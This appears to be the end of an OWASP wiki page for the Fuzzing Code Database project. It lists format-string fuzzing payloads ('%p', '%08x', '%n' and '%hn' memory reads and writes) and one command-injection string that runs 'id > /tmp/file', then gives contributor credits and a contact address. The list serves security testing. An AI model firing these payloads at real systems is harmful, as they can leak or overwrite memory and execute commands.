    XXXXX`perl -e 'print ".%p" x 80'`
    `perl -e 'print ".%p" x 80'`%n
    %08x.%08x.%08x.%08x.%08x\n
    XXX0_%08x.%08x.%08x.%08x.%08x\n
    %.16705u%2\$hn
    \x10\x01\x48\x08_%08x.%08x.%08x.%08x.%08x
    |%s
    |
    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;id > /tmp/file; exit;

#### Project Contributor

Project Leader: [**Wagner Elias**](:User:Wagner.elias "wikilink")

Reviewer: [**Eduardo Neves**](:User:eneves "wikilink")

Contributor: [**Ulisses Castro**](:User:Ulisses_Castro "wikilink")
[**Adam Muntner**](:User:Adam.muntner "wikilink")

#### Feedback and Participation

We hope you find the Fuzzing Code Database useful. Please contribute to
the Project by volunteering for one of the tasks, sending your comments,
questions, and suggestions to wagner.elias |at | owasp.org

#### Project Identification

__NOTOC__ <headertabs />

[Fuzzing Code Database](Category:OWASP_Project "wikilink")
[Category:OWASP_Document](Category:OWASP_Document "wikilink")
[Category:OWASP_Alpha_Quality_Document](Category:OWASP_Alpha_Quality_Document "wikilink")